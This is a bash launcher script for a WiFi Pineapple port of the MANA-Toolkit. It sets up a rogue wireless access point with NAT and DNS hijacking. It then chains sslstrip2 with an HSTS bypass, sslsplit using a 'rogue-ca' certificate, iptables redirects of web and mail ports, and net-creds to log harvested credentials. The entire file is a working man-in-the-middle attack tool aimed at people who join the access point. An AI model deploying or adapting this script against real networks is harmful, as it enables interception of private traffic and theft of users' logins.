#!/bin/bash
# This script is created by Andreas Nilsen / Zylla  - adde88@gmail.com - https://www.github.com/adde88
#
# It's meant to be a part of the MANA-Toolkit ported for the WiFi Pineapple NANO/TETRA.
# It therefore contains special functions for these devices, for example: locating the SD-card on the Pineapple NANO.
#
# It will probably work fine with other devices and versions of OpenWRT. If not, just contact me on GitHub, or the Hak5 Forums.
# Broadcom devices might be a problem
#
# License below:
# do What The Fuck you want to Public License

# Version 1.0, March 2000
# Copyright (C) 2000 Banlu Kemiyatorn (]d).
# 136 Nives 7 Jangwattana 14 Laksi Bangkok
# Everyone is permitted to copy and distribute verbatim copies
# of this license document, but changing it is not allowed.

# Ok, the purpose of this license is simple
# and you just
# DO WHAT THE FUCK YOU WANT TO.
#
#
# Colorize the shit out of this script lol:
RED='\033[0;31m'
NC='\033[0m'
# Upstream and default wireless device
upstream="br-lan"
phy="wlan1"
# Some default vars
flag="1"
sd_card="0"
sed -i 's/127.0.0.1/8.8.8.8/g' /etc/resolv.conf         # This fixes a "strange" bug on the Pineapples. Without this: internet activity will not be found. Haven't debugged it yet. Therefore this dirty fix.

# Functions below.

function safe_startup {
        killall hostapd-mana &>/dev/null
        killall dnsmasq &>/dev/null
        killall sslsplit &>/dev/null
        killall python &>/dev/null
}

function select_dev {
        if [ ! -z "$1" ]; then
                phy="$1"
        fi
        sed -i "s/^interface=.*$/interface="$phy"/" "$conf"
}

function check_sd {
        if [ -e /sd ]; then
                sd_card="1"
        fi
        if [ "$sd_card" == "1" ]; then
                conf="/sd/etc/mana-toolkit/hostapd-mana.conf"
                dhcp_conf="/sd/etc/mana-toolkit/dnsmasq-dhcpd.conf"
                sslstrip_dir="/sd/usr/share/mana-toolkit/sslstrip-hsts/sslstrip2/"                
                sslstrip_bin="/sd/usr/share/mana-toolkit/sslstrip-hsts/sslstrip2/sslstrip.py"
                sslstrip_logfile="/pineapple/modules/ManaToolkit/log/sslstrip.log"
                dns2proxy_dir="/sd/usr/share/mana-toolkit/sslstrip-hsts/dns2proxy/"
                dns2proxy_bin="/sd/usr/share/mana-toolkit/sslstrip-hsts/dns2proxy/dns2proxy.py"
                sslsplit_logdir="/pineapple/modules/ManaToolkit/log/"
                ca_cert_pem="/sd/usr/share/mana-toolkit/cert/rogue-ca.pem"
                ca_key="/sd/usr/share/mana-toolkit/cert/rogue-ca.key"
                sslsplit_connect_log="/pineapple/modules/ManaToolkit/log/sslsplit-connect.log"
                netcreds_bin="/sd/usr/share/mana-toolkit/net-creds/net-creds.py"
                netcreds_log="/pineapple/modules/ManaToolkit/log/net-creds.log"
                varlib="/sd/var/lib/mana-toolkit/"
        else
                conf="/etc/mana-toolkit/hostapd-mana.conf"
                dhcp_conf="/etc/mana-toolkit/dnsmasq-dhcpd.conf"
                sslstrip_dir="/usr/share/mana-toolkit/sslstrip-hsts/sslstrip2/"
                sslstrip_bin="/usr/share/mana-toolkit/sslstrip-hsts/sslstrip2/sslstrip.py"
                sslstrip_logfile="/pineapple/modules/ManaToolkit/log/sslstrip.log"
                dns2proxy_dir="/usr/share/mana-toolkit/sslstrip-hsts/dns2proxy/"                
                dns2proxy_bin="/usr/share/mana-toolkit/sslstrip-hsts/dns2proxy/dns2proxy.py"
                sslsplit_logdir="/pineapple/modules/ManaToolkit/log/"
                ca_cert_pem="/usr/share/mana-toolkit/cert/rogue-ca.pem"
                ca_key="/usr/share/mana-toolkit/cert/rogue-ca.key"
                sslsplit_connect_log="/pineapple/modules/ManaToolkit/log/sslsplit-connect.log"
                netcreds_bin="/usr/share/mana-toolkit/net-creds/net-creds.py"
                netcreds_log="/pineapple/modules/ManaToolkit/log/net-creds.log"
                varlib="/var/lib/mana-toolkit/"
        fi
        mkdir -p "$varlib"
}

function check_device {
        ifconfig "$phy" up &> /dev/null
        if [ ! -e /sys/class/net/"$phy" ]; then
                flag=0
                echo -e "Cannot find wireless interface: "$phy"\n"
                exit 2
        fi
}

function check_cpu {
        CPU=`cat /proc/cpuinfo | grep -i machine | awk -F":" '{print $2}'`
        #echo -e "Current CPU: ${RED}"$CPU"${NC}."                                      # TO BE USED IN FUTURE UPDATE, MAYBE.
}

function flush_iptables {
        iptables --policy INPUT ACCEPT
        iptables --policy FORWARD ACCEPT
        iptables --policy OUTPUT ACCEPT
        iptables -F
        iptables -F -t nat

}

function masquerade_start {
        iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
        iptables -A FORWARD -i "$phy" -o $upstream -j ACCEPT
        iptables -t nat -A PREROUTING -i "$phy" -p udp --dport 53 -j DNAT --to 10.0.0.1
}

function fking_rule {
        for table in $(ip rule list | awk -F"lookup" '{print $2}');
        do
        DEF=`ip route show table "$table"|grep default|grep "$upstream"`
        if ! [ -z "$DEF" ]; then
                break
        fi
        done
        ip route add 10.0.0.0/24 dev "$phy" scope link table $table
}

function nat_forward {
        echo '1' > /proc/sys/net/ipv4/ip_forward
        ip addr flush dev "$phy"
        ip addr add 10.0.0.1/24 dev "$phy"
        ip link set "$phy" up
        ip route add default via 10.0.0.1 dev "$phy"
}

function sslstrip_plus_start {
        cd "$sslstrip_dir"
        python sslstrip.py -l 10000 -a -w "$sslstrip_logfile" &
        iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
        cd "$dns2proxy_dir"
        python dns2proxy.py -i "$phy" &
        cd -
}

function sslsplit_start {
        sslsplit -D -P -Z -S "$sslsplit_logdir" -c "$ca_cert_pem" -k "$ca_key" -O -l "$sslsplit_connect_log" \
        https 0.0.0.0 10443 \
        http 0.0.0.0 10080 \
        ssl 0.0.0.0 10993 \
        tcp 0.0.0.0 10143 \
        ssl 0.0.0.0 10995 \
        tcp 0.0.0.0 10110 \
        ssl 0.0.0.0 10465 \
        tcp 0.0.0.0 10025 &
}

function sslsplit_iptables {
        #iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 80 -j REDIRECT --to-port 10080
        iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 25 -j REDIRECT --to-port 10025
        iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 110 -j REDIRECT --to-port 10110
        iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 143 -j REDIRECT --to-port 10143
        iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 443 -j REDIRECT --to-port 10443
        iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 465 -j REDIRECT --to-port 10465
        iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 993 -j REDIRECT --to-port 10993
        iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 995  -j REDIRECT --to-port 10995
        iptables -t nat -A PREROUTING -i "$phy" -p tcp --destination-port 65493 -j REDIRECT --to-port 10993
}

function netcreds_start {
        python "$netcreds_bin" -i "$phy" >> "$netcreds_log"
}

function shutdown_mana {
        killall dnsmasq &>/dev/null
        killall hostapd-mana &>/dev/null
        killall sslsplit &>/dev/null
        killall python &>/dev/null
        # Restore iptables
        iptables-restore < /tmp/rules.txt
        rm /tmp/rules.txt
        # Remove iface and route
        ip addr flush dev "$phy"
        ip link set "$phy" down
}

function check_internet {
        if ping -c 1 google.com >> /dev/null 2>&1; then
                echo -e "Device seems to be: ${RED}ONLINE${NC}."
                echo -e "Remember: Press ${RED}CTRL+C${NC} to kill MANA-Toolkit properly.\n"
        else
                echo -e "Device seems to be: ${RED}OFFLINE${NC}."
                exit 1
        fi
}

function startup {
        if [ "$flag" == "1" ];then
                check_internet                                                                  # Check for a working internet connection by using ping
                nat_forward                                                                     # Setup interfaces and forward traffic
                hostapd-mana "$conf" &                                                          # Start hostapd-mana
                dnsmasq -z -C "$dhcp_conf" -i "$phy" -I lo                                      # Setup DHCP Server
                fking_rule                                                                      # Add fking rule to table 1006
                iptables-save > /tmp/rules.txt                                                  # Save iptables
                flush_iptables                                                                  # Flush
                masquerade_start                                                                # Masquerade
                sslstrip_plus_start                                                             # SSLStrip+ with HSTS bypass
                sslsplit_start                                                                  # SSLSplit
                sslsplit_iptables                                                               # Setup IPtables for SSLsplit
                netcreds_start                                                                  # Start net-creds
                read -rsp $'\n' -n1 key
        fi
}
        check_sd        # Tries to find out if any SD-cards are installed. If so, it changes directory variables to rather use the SD-card. ** Pineapple NANO/TETRA "Fix" **
        select_dev      # Lets the user select another wireless device to be used. If none is selected: the default device will be used (wlan1)
        safe_startup    # Kills any running processes that could interfere with MANA.
        check_device    # Check if the wireless device is up
        startup         # Starts MANA-Toolkit core-functions.
        shutdown_mana   # Shuts down the MANA-Toolkit after user input
        exit 0          # Exit gracefully
